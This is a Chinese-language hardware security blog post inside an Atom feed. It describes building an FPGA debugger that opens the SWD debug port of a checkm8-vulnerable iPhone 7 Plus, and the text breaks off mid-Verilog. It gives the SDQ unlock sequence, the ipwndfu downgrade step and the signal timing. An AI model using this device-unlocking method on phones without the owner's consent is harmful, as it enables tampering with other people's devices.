<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-09-03T21:09:21+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">极目楚天舒</title><subtitle>专注于系统底层安全的研究员，主要研究 Linux 内核漏洞挖掘与利用、iPhone 硬件安全、Intel 处理器安全， 致力于探索复杂系统背后的安全风险</subtitle><entry><title type="html">iPhone SWD 调试器的开发</title><link href="http://localhost:4000/hardware/2025/08/30/iphone-SWD-%E8%B0%83%E8%AF%95%E5%99%A8.html" rel="alternate" type="text/html" title="iPhone SWD 调试器的开发" /><published>2025-08-30T13:27:38+08:00</published><updated>2025-08-30T13:27:38+08:00</updated><id>http://localhost:4000/hardware/2025/08/30/iphone-SWD-%E8%B0%83%E8%AF%95%E5%99%A8</id><content type="html" xml:base="http://localhost:4000/hardware/2025/08/30/iphone-SWD-%E8%B0%83%E8%AF%95%E5%99%A8.html"><![CDATA[<p>PANDA 2025 安全大会上，我们在 iPhone 7 plus 上面成功启动 Linux 内核，我们继续探索苹果手机硬件安全，并于近日成功打开了  iPhone 7 plus 的 SWD 硬件调试端口。</p>

<h1 id="lighting-接口原理">lighting 接口原理</h1>

<p><a href="https://nyansatan.github.io/lightning/">Apple Lightning</a></p>

<p><a href="https://www.youtube.com/watch?v=8p3Oi4DL0eI">DEF CON 30 - stacksmashing  - The Hitchhacker’s Guide to iPhone Lightning and JTAG Hacking</a></p>

<h2 id="lighting-接口历史">lighting 接口历史</h2>

<p>苹果的 Lightning 接口从 <strong>2012年</strong> 的 iPhone 5 开始启用，直到 <strong>2023年</strong> 的 iPhone 14 系列和 iPhone SE（第3代）为止，之后的机型就全面转向 USB-C 了。</p>

<table>
  <thead>
    <tr>
      <th><strong>手机系列</strong></th>
      <th><strong>具体型号</strong></th>
      <th><strong>发布时间</strong></th>
      <th><strong>状态</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>iPhone SE</strong></td>
      <td>第1代、第2代、第3代</td>
      <td>2016-2022</td>
      <td>已停产停售</td>
    </tr>
    <tr>
      <td><strong>iPhone 5</strong></td>
      <td>iPhone 5、iPhone 5c、iPhone 5s</td>
      <td>2012-2013</td>
      <td>已停产停售</td>
    </tr>
    <tr>
      <td><strong>iPhone 6</strong></td>
      <td>iPhone 6、iPhone 6 Plus</td>
      <td>2014</td>
      <td>已停产停售</td>
    </tr>
    <tr>
      <td><strong>iPhone 7</strong></td>
      <td>iPhone 7、iPhone 7 Plus</td>
      <td>2016</td>
      <td>已停产停售</td>
    </tr>
    <tr>
      <td><strong>iPhone 8</strong></td>
      <td>iPhone 8、iPhone 8 Plus</td>
      <td>2017</td>
      <td>已停产停售</td>
    </tr>
    <tr>
      <td><strong>iPhone X</strong></td>
      <td>iPhone X</td>
      <td>2017</td>
      <td>已停产停售</td>
    </tr>
    <tr>
      <td><strong>iPhone XS</strong></td>
      <td>iPhone XS、iPhone XS Max</td>
      <td>2018</td>
      <td>已停产停售</td>
    </tr>
    <tr>
      <td><strong>iPhone XR</strong></td>
      <td>iPhone XR</td>
      <td>2018</td>
      <td>已停产停售</td>
    </tr>
    <tr>
      <td><strong>iPhone 11</strong></td>
      <td>iPhone 11、iPhone 11 Pro、iPhone 11 Pro Max</td>
      <td>2019</td>
      <td>已停产停售</td>
    </tr>
    <tr>
      <td><strong>iPhone 12</strong></td>
      <td>iPhone 12、iPhone 12 mini、iPhone 12 Pro、iPhone 12 Pro Max</td>
      <td>2020</td>
      <td>已停产停售</td>
    </tr>
    <tr>
      <td><strong>iPhone 13</strong></td>
      <td>iPhone 13、iPhone 13 mini、iPhone 13 Pro、iPhone 13 Pro Max</td>
      <td>2021</td>
      <td>已停产停售</td>
    </tr>
    <tr>
      <td><strong>iPhone 14</strong></td>
      <td>iPhone 14、iPhone 14 Plus、iPhone 14 Pro、iPhone 14 Pro Max</td>
      <td>2022</td>
      <td>已停产停售</td>
    </tr>
  </tbody>
</table>

<h2 id="lighting-接口实物图">lighting 接口实物图</h2>

<h3 id="lighting-母座">lighting 母座</h3>

<p>母座一般情况下就是我们手机上面的充电口，实际使用8个引脚：</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/image.png" alt="image.png" /></p>

<ul>
  <li>ID0 和 ID1 是功能选择信号线。当公头插入的时候，公头内置的协议芯片通过这两个引脚与设备通信，告知设备选通“USB通信、串口通信、SWD通信、充电”四者之一的功能。</li>
  <li>L0p L0n 和 L1p L1n 是两对差分线，在USB通信功能被选通的情况下，用于传输 USB 数据。</li>
  <li>PWR 引脚用于充电，或者对外提供电源。</li>
</ul>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/lightning_port_pinout.jpg" alt="lightning_port_pinout.jpg" /></p>

<h3 id="lighting-公头">lighting 公头</h3>

<p>公头是双面结构，每个面都有8个触点。</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/c9153d2417884c2388d32a539ca7310e.webp" alt="c9153d2417884c2388d32a539ca7310e.webp" /></p>

<p>这个是双面夹层的电气结构，其中 ACC_ID 和 ACC_PWR 分别对应于母座的 ID0 和 ID1 引脚。</p>

<p>可以看到正反两面除了 ACC_ID 、 ACC_PWR两个触点，其他触点都是左右镜像的，这可以保证无论公头的插入方向是什么，供电引脚和数据引脚都能与母座对应。</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/%E5%85%AC%E5%8F%A3%E7%94%B5%E6%B0%94%E7%BB%93%E6%9E%84.jpg" alt="公口电气结构.jpg" /></p>

<h2 id="lighting-接口电路">lighting 接口电路</h2>

<p>lighting 接口电路的核心功能是有一个多路复用器，一端与母座连接，另一端与 SoC 芯片管脚相连。</p>

<p>公头插入母座的时候，公头内部的通信芯片从母座的 PWR 和 GND 引脚获取电源，通过 ID0 和 ID1 与多路复用器通信，通信协议是德州仪器未公开的 SDQ 协议。</p>

<p>通信过程的内容包括功能选通、状态读取、接口配置。</p>

<p>通常情况下用户接触到最多的是 USB 通信和充电这两个功能，</p>

<p>SWD 调试端口功能需要利用 <a href="https://www.notion.so/checkm8-1a03f4b7819d80a099bad5da127b8372?pvs=21">checkm8</a> 漏洞降级设备之后，再向设备发送特定的 SDQ 序列才能选通，这是本文讨论的主要内容之一。</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/%E6%9C%AA%E5%91%BD%E5%90%8D%E7%BB%98%E5%9B%BE.jpg" alt="未命名绘图.jpg" /></p>

<h1 id="sdq-协议原理">SDQ 协议原理</h1>

<p>SDQ 协议最早是德州仪器公司为苹果设备开发的单线（1-wire）通信协议，该协议至今未开源。</p>

<p>SDQ 通信只需要一根线就能完成，连接主从设备。通常情况下 iPhone 作为主设备，与之相连的数据线作为从设备。</p>

<p>母座检测到公头插入的时候，会在 ID0 和 ID1 两个引脚交替发起轮询，等待应答。</p>

<p>公头通过 ID0 或者 ID1 两者之一的引脚与设备通信。</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/image%201.png" alt="image.png" /></p>

<h2 id="例子usb-数据通信过程">例子：USB 数据通信过程</h2>

<p>下图是逻辑分析仪抓取到的 USB 通信过程，截取了最开始 SDQ 通信部分。</p>

<p>“74 00 02 1f” 序列由设备的 lighting 接口电路发起，等待外部应答。</p>

<p>插入 lighting 数据线之后，数据线响应 “75 10 09 08 00 00 00 a8” 序列，表示选通 USB 通信功能。</p>

<p>lighting 接口电路切换电路功能到 USB 数据传输。</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/iPhone_SWD%E8%B0%83%E8%AF%95%E5%99%A8.jpg" alt="iPhone SWD调试器.jpg" /></p>

<h2 id="数据格式">数据格式</h2>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/iPhone_SWD%E8%B0%83%E8%AF%95%E5%99%A8-%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F.jpg" alt="iPhone SWD调试器-数据格式.jpg" /></p>

<p>CRC 计算参数如下：</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/D9B360FB-0E77-4008-B9C2-6DA9AF3FB0CF.png" alt="{D9B360FB-0E77-4008-B9C2-6DA9AF3FB0CF}.png" /></p>

<h2 id="比特位的表示">比特位的表示</h2>

<p>单字节中间，比特 0 的周期为 10 微秒，其中低电平占 7 微秒；</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/047CA35B-D51C-4A5B-93DB-6BE63B0F77C1.png" alt="{047CA35B-D51C-4A5B-93DB-6BE63B0F77C1}.png" /></p>

<p>单字节第 7 位，比特 0 的周期为 27.5 微秒，其中低电平占 7 微秒；</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/F14469CC-A9C6-4086-B505-E342B1D73475.png" alt="{F14469CC-A9C6-4086-B505-E342B1D73475}.png" /></p>

<p>单字节中间，比特 1 的周期为 10 微秒，其中低电平占 2 微秒；</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/FC8A4901-1F2C-41CA-AA35-8126F326F0F6.png" alt="{FC8A4901-1F2C-41CA-AA35-8126F326F0F6}.png" /></p>

<p>单字节第 7 位，比特 1 的周期为 27.5 微秒，其中低电平占 2 微秒；</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/5E821473-7509-47DE-B181-4510805D5C55.png" alt="{5E821473-7509-47DE-B181-4510805D5C55}.png" /></p>

<h2 id="引脚状态切换">引脚状态切换</h2>

<ol>
  <li>iphone 占用信号线，数据线高阻态；</li>
  <li>方向切换，耗时大约 120 微秒；</li>
  <li>数据线占用信号线，lighting 电路高阻态。</li>
</ol>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/iPhone_SWD%E8%B0%83%E8%AF%95%E5%99%A8-usb%E9%80%9A%E4%BF%A1%E8%BF%87%E7%A8%8B.jpg" alt="iPhone SWD调试器-usb通信过程.jpg" /></p>

<h2 id="lighting-数据线解剖">lighting 数据线解剖</h2>

<p>市售的 lighting 数据线分为 2 类：一类内嵌协议芯片，另一类不带协议芯片。</p>

<p>淘宝平台上若不特殊说明，搜到的都是第一类数据线。</p>

<p>解剖可以看到里面包含了一颗电源芯片和一颗协议芯片。这类数据线插入手机后，会通过母座的 PWR 和 GND 引脚拉取电源，使用 ID0 或者 ID1 引脚与手机的 lighting 接口电路进行 SDQ 通信，根据用户选择的“仅充电”或者“文件传输”选项，选通 USB 功能或者充电功能。</p>

<p>我们只能控制 PWR 、GND 、D+ 、D-  四个引脚。</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/lighting%E8%A7%A3%E5%89%96.jpg" alt="lighting解剖.jpg" /></p>

<p>这类数据线显然不能满足我们的需求，我们需要 8 个引脚都能够被我们控制。淘宝搜索 “lighting 扩展线 ”：</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/iPhone_SWD%E8%B0%83%E8%AF%95%E5%99%A8-%E7%AC%AC_5_%E9%A1%B5.jpg" alt="iPhone SWD调试器-第 5 页.jpg" /></p>

<h2 id="sdq-协议破解途径">SDQ 协议破解途径</h2>

<h3 id="途径一早期芯片数据手册">途径一：早期芯片数据手册</h3>

<p>德州仪器早年的产品有数据手册流传到网上，有部分功能与现在的产品重合。</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/iPhone_SWD%E8%B0%83%E8%AF%95%E5%99%A8-%E7%AC%AC_7_%E9%A1%B5.jpg" alt="iPhone SWD调试器-第 7 页.jpg" /></p>

<h3 id="途径二富士康工程线抓包">途径二：富士康工程线抓包</h3>

<p>富士康工厂内部的调试线和专用软件经过一些渠道流入二手市场，极客们使用逻辑分析仪嗅探发现了打开 SWD 调试端口的序列码。</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/iPhone_SWD%E8%B0%83%E8%AF%95%E5%99%A8-%E7%AC%AC_8_%E9%A1%B5.jpg" alt="iPhone SWD调试器-第 8 页.jpg" /></p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/659BC51B-4FA8-4FA2-AADB-E0753D4C4B11.png" alt="{659BC51B-4FA8-4FA2-AADB-E0753D4C4B11}.png" /></p>

<h1 id="山寨调试器现状">“山寨”调试器现状</h1>

<p>拿到了开启 SWD 调试端口的 “金钥匙”之后，国外有极客团队开发出了专用调试器，比较著名的有：</p>

<p>Bonobo Cable （固件加密、不开源）</p>

<p>Kanzi Cable （不开源）</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/image%202.png" alt="image.png" /></p>

<p>这类调试器普遍比较昂贵，其中 Bonobo Cable 卖到了 749 欧元，折合人民币 6275 元，而且目前是售罄状态。</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/EDE796FA-9EBD-470F-9DCE-567653DA11AD.png" alt="{EDE796FA-9EBD-470F-9DCE-567653DA11AD}.png" /></p>

<p>咸鱼上的 Kanzi Cable 卖到了 1110 元人民币以上，不包好坏，不包售后，懂的来……</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/iPhone_SWD%E8%B0%83%E8%AF%95%E5%99%A8-%E7%AC%AC_9_%E9%A1%B5.jpg" alt="iPhone SWD调试器-第 9 页.jpg" /></p>

<h1 id="fpga实现方案">FPGA实现方案</h1>

<p>我们无需知晓 SDQ 协议每个字段的意义，只需要按照如下步骤就能打开 SWD 调试端口：</p>

<ol>
  <li>调试的目标设备是受 <a href="https://www.notion.so/checkm8-1a03f4b7819d80a099bad5da127b8372?pvs=21">checkm8</a> 漏洞影响的 iPhone 设备，这里我们用的是 iPhone 7 plus，处理器型号是 A10 fusion；</li>
  <li>使用 <a href="https://github.com/axi0mX/ipwndfu">ipwndfu</a> 工具对手机进行降级，使能 SWD 调试功能；</li>
  <li>iphone 发起轮询序列 “74 00 02 1F” ；</li>
  <li>外部响应 “75 A0 00 00 00 00 00 40” 序列，这样 lighting 接口就会切换成 SWD 调试口，其中 ID0 引脚对应 SWDIO， ID1 引脚对应 SWCLK；</li>
</ol>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/iPhone_SWD%E8%B0%83%E8%AF%95%E5%99%A8-%E7%AC%AC_10_%E9%A1%B5.jpg" alt="iPhone SWD调试器-第 10 页.jpg" /></p>

<p>通过实际抓包测量得到 SDQ 信号的参考电压是 3.3伏</p>

<h2 id="物料清单">物料清单</h2>

<ul>
  <li>
    <p>赛灵思 xc7a100t FPGA 开发板；</p>

    <p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/1bf2d0fd6722dcafda05910ac8322b45e4d3b4f2.png1192w.webp" alt="1bf2d0fd6722dcafda05910ac8322b45e4d3b4f2.png@1192w.webp" /></p>
  </li>
  <li>iPhone 7 plus 手机；</li>
  <li>
    <p>Jlink 调试器；</p>

    <p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/204d5d3466926f69a3dfde4680533355.jpg" alt="204d5d3466926f69a3dfde4680533355.jpg" /></p>
  </li>
  <li>逻辑分析仪；</li>
</ul>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_2025-08-25_204019_775(1).jpg" alt="微信图片_2025-08-25_204019_775(1).jpg" /></p>

<ul>
  <li>自制 lighting 接口转接板</li>
</ul>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/iPhone_SWD%E8%B0%83%E8%AF%95%E5%99%A8-%E7%AC%AC_11_%E9%A1%B5.jpg" alt="iPhone SWD调试器-第 11 页.jpg" /></p>

<h2 id="器件连接">器件连接</h2>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/iPhone_SWD%E8%B0%83%E8%AF%95%E5%99%A8-%E7%AC%AC_12_%E9%A1%B5.jpg" alt="iPhone SWD调试器-第 12 页.jpg" /></p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/e01e492c7dbe195da9e4ad6faeed674d.jpg" alt="e01e492c7dbe195da9e4ad6faeed674d.jpg" /></p>

<p>上图的各部分作用如下：</p>

<ul>
  <li>FPGA 检测到 ID0 引脚发出轮询序列，通过 Y16 引脚响应 “75 A0 00 00 00 00 00 40” 序列，选通 lighting 接口电路的 SWD 调试功能；</li>
  <li>FPGA 通过 Y13 引脚提供 20k 电阻下拉，Y16 引脚响应 “75 A0 00 00 00 00 00 40” 序列之后立即切换为 20k 电阻上拉；</li>
  <li>jlink 调试器通过并联的方式接入电路，在 Y16 引脚切换为上拉之后，提供时钟和调试信号。</li>
</ul>

<p>要注意的是，根据 ADIv6.0 <em>**</em>规范 page B4-130 的要求，SWDIO 引脚空闲状态下需要上拉以确保引脚处于确定的电平，防止电磁干扰。在实际中，若不上拉，在逻辑分析仪中会观察到很多毛刺，直接导致jlink 调试器无法正确采样。</p>

<p>根据工程实践，SWCLK 引脚在空闲时应该下拉，防止时钟毛刺。</p>

<p>lighting 接口电路并未对 SWDIO 和 SWCLK 引脚进行上下拉，所以在选通 SWD 调试功能后，需要从外部对 SWDIO 和 SWCLK 进行上下拉，否则 jlink 无法正确采集电平。</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/iPhone_SWD%E8%B0%83%E8%AF%95%E5%99%A8-%E7%AC%AC_13_%E9%A1%B5.jpg" alt="iPhone SWD调试器-第 13 页.jpg" /></p>

<p>经过反复实验确定 ID0 20k 下拉、ID1 20k 上拉，这样既能排除信号线毛刺，又能确保 jlink 调试器有足够的驱动能力。</p>

<p>需要注意的是，SWCLK、SWDIO、GND 三根线需要绞在一起，实际测量发现这样做可以消除很大一部分毛刺，提高 jlink 调试器的采样成功率。</p>

<h2 id="工作原理">工作原理</h2>

<h3 id="开启-swd-调试端口">开启 SWD 调试端口</h3>

<p>信号时序图如下：</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/iPhone_SWD%E8%B0%83%E8%AF%95%E5%99%A8-%E7%AC%AC_14_%E9%A1%B5.jpg" alt="iPhone SWD调试器-第 14 页.jpg" /></p>

<p>FPGA 判断轮询序列的规则是，检测到 2 次 break 信号就判断中间发生了一次轮询：</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/iPhone_SWD%E8%B0%83%E8%AF%95%E5%99%A8-%E7%AC%AC_15_%E9%A1%B5.jpg" alt="iPhone SWD调试器-第 15 页.jpg" /></p>

<p>break 的检测规则是，信号下降沿触发后，低电平持续 13.9 us 即判定产生了一次 break 信号。</p>

<p>实际采样发现，break 信号低电平持续时间在 13.5 ~ 15 us 之间。</p>

<p><img src="/assets/posts/2025-08-30-iphone-SWD-调试器/F2564C13-71E4-4638-AD13-CBAB66B799C2.png" alt="{F2564C13-71E4-4638-AD13-CBAB66B799C2}.png" /></p>

<div class="language-verilog highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// acc引脚采样 </span>
<span class="k">always</span> <span class="o">@</span><span class="p">(</span><span class="kt">posedge</span> <span class="n">sys_clk</span> <span class="kt">or</span> <span class="kt">negedge</span> <span class="n">rst</span><span class="p">)</span> <span class="k">begin</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">rst</span><span class="p">)</span> <span class="k">begin</span>
        <span class="n">break_d0</span> <span class="o">&lt;=</span> <span class="mb">1'b0</span><span class="p">;</span>
        <span class="n">break_d1</span> <span class="o">&lt;=</span> <span class="mb">1'b0</span><span class="p">;</span>
    <span class="k">end</span>
    <span class="k">else</span> <span class="k">begin</span>
        <span class="n">break_d0</span> <span class="o">&lt;=</span> <span class="n">acc_pin</span><span class="p">;</span>                <span class="c1">// 对acc_pin引脚的信号打2拍采样</span>
        <span class="n">break_d1</span> <span class="o">&lt;=</span> <span class="n">break_d0</span><span class="p">;</span>               <span class="c1">// 采到下降沿开始计数，采到上升沿停止计数</span>
    <span class="k">end</span>
<span class="k">end</span>

<span class="c1">// 检测到下降沿，break计数器使能</span>
<span class="k">always</span> <span class="o">@</span><span class="p">(</span><span class="kt">posedge</span> <span class="n">sys_clk</span> <span class="kt">or</span> <span class="kt">negedge</span> <span class="n">rst</span><span class="p">)</span> <span class="k">begin</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">rst</span><span class="p">)</span>
        <span class="n">break_cnt_en</span> <span class="o">&lt;=</span> <span class="mb">1'b0</span><span class="p">;</span>
    <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">acc_down</span> <span class="o">&amp;&amp;</span> <span class="n">delay_cnt</span> <span class="o">==</span> <span class="n">DELAY_CNT_MAX</span><span class="p">)</span> <span class="c1">// acc下降沿使能计数器</span>
        <span class="n">break_cnt_en</span> <span class="o">&lt;=</span> <span class="mb">1'b1</span><span class="p">;</span>
    <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">acc_up</span><span class="p">)</span>                         <span class="c1">// acc上升沿关闭计数器</span>
        <span class="n">break_cnt_en</span> <span class="o">&lt;=</span> <span class="mb">1'b0</span><span class="p">;</span>
    <span class="k">else</span>
        <span class="n">break_cnt_en</span> <span class="o">&lt;=</span> <span class="n">break_cnt_en</span><span class="p">;</span>       <span class="c1">// 状态位保持</span>
<span class="k">end</span>

<span class="c1">// break计数器更新</span>
<span class="k">always</span> <span class="o">@</span><span class="p">(</span><span class="kt">posedge</span> <span class="n">sys_clk</span> <span class="kt">or</span> <span class="kt">negedge</span> <span class="n">rst</span><span class="p">)</span> <span class="k">begin</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">rst</span><span class="p">)</span> <span class="k">begin</span>
        <span class="n">break_cnt</span> <span class="o">&lt;=</span> <span class="mb">10'b0</span><span class="p">;</span>
    <span class="k">end</span>
    <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">break_cnt_en</span> <span class="o">&amp;&amp;</span> <span class="n">break_cnt</span> <span class="o">&lt;</span> <span class="n">BREAK_CNT_MAX</span><span class="p">)</span>  <span class="c1">// 如果检测到下降沿，开始计数</span>
        <span class="n">break_cnt</span> <span class="o">&lt;=</span> <span class="n">break_cnt</span> <span class="o">+</span> <span class="mb">1'b1</span><span class="p">;</span>
    <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">break_cnt_en</span> <span class="o">&amp;&amp;</span> <span class="n">break_cnt</span> <span class="o">==</span> <span class="n">BREAK_CNT_MAX</span><span class="p">)</span> <span class="c1">// 如果低电平达到15us，清零计数器</span>
        <span class="n">break_cnt</span> <span class="o">&lt;=</span> <span class="mb">10'b0</span><span class="p">;</span>
    <span class="k">else</span>
        <span class="n">break_cnt</span> <span class="o">&lt;=</span> <span class="mb">1'b0</span><span class="p">;</span>
<span class="k">end</span>

<span class="c1">// 发送使能置位</span>
<span class="k">always</span> <span class="o">@</span><span class="p">(</span><span class="kt">posedge</span> <span class="n">sys_clk</span> <span class="kt">or</span> <span class="kt">negedge</span> <span class="n">rst</span><span class="p">)</span> <span class="k">begin</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">rst</span><span class="p">)</span>
        <span class="n">break_ok</span> <span class="o">&lt;=</span> <span class="mb">1'b0</span><span class="p">;</span>
    <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="k">break</span> <span class="o">==</span> <span class="mi">2'd2</span><span class="p">)</span>
        <span class="n">break_ok</span> <span class="o">&lt;=</span> <span class="mb">1'b1</span><span class="p">;</span>
    <span class="k">else</span>
        <span class="n">break_ok</span> <span class="o">&lt;=</span> <span class="n">break_ok</span><span class="p">;</span>
<span class="k">end</span>

<span class="k">parameter</span>   <span class="n">SYS_CLK_PERIOD</span> <span class="o">=</span> <span class="mi">20</span><span class="p">;</span>           <span class="c1">// 系统时钟周期，20ns</span>
<span class="k">parameter</span>   <span class="n">BREAK_AVERAGE_PERIOD</span> <span class="o">=</span> <span class="mi">13500</span><span class="p">;</span>  <span class="c1">// break标志位平均时间占据13.5us</span>
<span class="k">parameter</span>   <span class="n">BREAK_MAX_PERIOD</span> <span class="o">=</span> <span class="mi">15000</span><span class="p">;</span> <span class="c1">// break标志位最大时间，如果超过15ms那么判定不是break</span>
<span class="k">parameter</span>   <span class="n">BREAK_CNT_AVERAGE</span> <span class="o">=</span> <span class="n">BREAK_AVERAGE_PERIOD</span> <span class="o">/</span> <span class="n">SYS_CLK_PERIOD</span><span class="p">;</span>
<span class="k">parameter</span>   <span class="n">BREAK_CNT_MAX</span> <span class="o">=</span> <span class="n">BREAK_MAX_PERIOD</span> <span class="o">/</span> <span class="n">SYS_CLK_PERIOD</span><span class="p">;</span>
<span class="c1">// 判断是否检测到break标志位</span>
<span class="k">always</span> <span class="o">@</span><span class="p">(</span><span class="kt">posedge</span> <span class="n">sys_clk</span> <span class="kt">or</span> <span class="kt">negedge</span> <span class="n">rst</span><span class="p">)</span> <span class="k">begin</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">rst</span><span class="p">)</span>
        <span class="k">break</span> <span class="o">&lt;=</span> <span class="mb">2'b0</span><span class="p">;</span>         <span class="c1">// 低电平持续时间在13.5us ~ 15us之间视为break</span>
    <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">acc_up</span> <span class="o">&amp;&amp;</span> <span class="n">break_cnt</span> <span class="o">&gt;=</span> <span class="n">BREAK_CNT_AVERAGE</span> <span class="o">&amp;&amp;</span> <span class="n">break_cnt</span> <span class="o">&lt;</span> <span class="n">BREAK_CNT_MAX</span><span class="p">)</span> 
        <span class="k">break</span> <span class="o">&lt;=</span> <span class="k">break</span> <span class="o">+</span> <span class="mb">1'b1</span><span class="p">;</span> <span class="c1">// break信号计数器递增，在第二个break标志位触发发送swd序列的行为</span>
    <span class="k">else</span>
        <span class="k">break</span> <span class="o">&lt;=</span> <span class="k">break</span><span class="p">;</span>
<span class="k">end</span>

<span class="c1">// 第二次break之后，延迟19us使能发送，这段时间acc引脚会保持高电平</span>
<span class="k">always</span> <span class="o">@</span><span class="p">(</span><span class="kt">posedge</span> <span class="n">sys_clk</span> <span class="kt">or</span> <span class="kt">negedge</span> <span class="n">rst</span><span class="p">)</span> <span class="k">begin</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">rst</span><span class="p">)</span>
        <span class="n">pre_send_cnt</span> <span class="o">&lt;=</span> <span class="mb">10'b0</span><span class="p">;</span>
    <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">break_ok</span><span class="p">)</span>
        <span class="k">if</span><span class="p">(</span><span class="n">pre_send_cnt</span> <span class="o">&lt;</span> <span class="n">AFTER_BREAK_BEFORE_SEND_CNT_MAX</span><span class="p">)</span>
            <span class="n">pre_send_cnt</span> <span class="o">&lt;=</span> <span class="n">pre_send_cnt</span> <span class="o">+</span> <span class="mb">1'b1</span><span class="p">;</span>
        <span class="k">else</span>
            <span class="n">pre_send_cnt</span> <span class="o">&lt;=</span> <span class="n">AFTER_BREAK_BEFORE_SEND_CNT_MAX</span><span class="p">;</span>
    <span class="k">else</span>
        <span class="n">pre_send_cnt</span> <span class="o">&lt;=</span> <span class="mb">10'b0</span><span class="p">;</span> 
<span class="k">end</span>

</code></pre></div></div>

<p>若检测到两次 break 信号，则 break_ok 标志位置位，那么 acc 引脚切换到 acc_pin_wire ，</p>

<p>acc_pin_wire 是连接到发送 “75 A0 00 00 00 00 00 40” 序列模块的 wire 类型变量，</p>

<p>“75 A0 00 00 00 00 00 40” 序列发送完毕后，send_done 标志位置位，acc 切换到高阻态并上拉。</p>

<div class="language-verilog highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// acc引脚功能切换，若发送使能置位，acc_pin和acc_wire相连接，发送序列</span>
<span class="c1">// 否则处于高阻态，20k上拉</span>
<span class="k">assign</span> <span class="n">acc_pin</span> <span class="o">=</span> <span class="p">(</span><span class="n">break_ok</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">send_done</span><span class="p">)</span> <span class="o">?</span> <span class="n">acc_pin_wire</span> <span class="o">:</span> <span class="mb">1'bz</span><span class="p">;</span>
<span class="k">assign</span> <span class="n">swclk</span> <span class="o">=</span> <span class="mb">1'bz</span><span class="p">;</span>   <span class="c1">// swclk引脚保持高阻态，20k下拉</span>

<span class="c1">// 引脚约束文件</span>
<span class="c1">//----------------------------设置ACC引脚3.3v电平--------------------------------</span>
<span class="n">set_property</span> <span class="o">-</span><span class="n">dict</span> <span class="o">{</span><span class="n">PACKAGE_PIN</span> <span class="n">Y16</span> <span class="n">IOSTANDARD</span> <span class="n">LVCMOS33</span><span class="o">}</span> <span class="p">[</span><span class="n">get_ports</span> <span class="n">acc_pin</span><span class="p">]</span>
<span class="c1">//---------------------------------设置ACC引脚上拉，上拉电阻20K-------------------</span>
<span class="n">set_property</span> <span class="n">PULLUP</span> <span class="n">TRUE</span> <span class="p">[</span><span class="n">get_ports</span> <span class="o">{</span><span class="n">acc_pin</span><span class="o">}</span><span class="p">]</span>          
<span class="n">set_property</span> <span class="n">PULLUP_RESISTOR</span> <span class="mi">20</span><span class="n">K</span> <span class="p">[</span><span class="n">get_ports</span> <span class="o">{</span><span class="n">acc_pin</span><span class="o">}</span><span class="p">]</span>
<span class="c1">//-----------------------------设置SWCLK引脚3.3v电平-----------------------------</span>
<span class="n">set_property</span> <span class="o">-</span><span class="n">dict</span> <span class="o">{</span><span class="n">PACKAGE_PIN</span> <span class="n">Y13</span> <span class="n">IOSTANDARD</span> <span class="n">LVCMOS33</span><span class="o">}</span> <span class="p">[</span><span class="n">get_ports</span> <span class="n">swclk</span><span class="p">]</span>
<span class="c1">//-----------------------------设置SWCLK引脚下拉，下拉电阻20K-------------------</span>
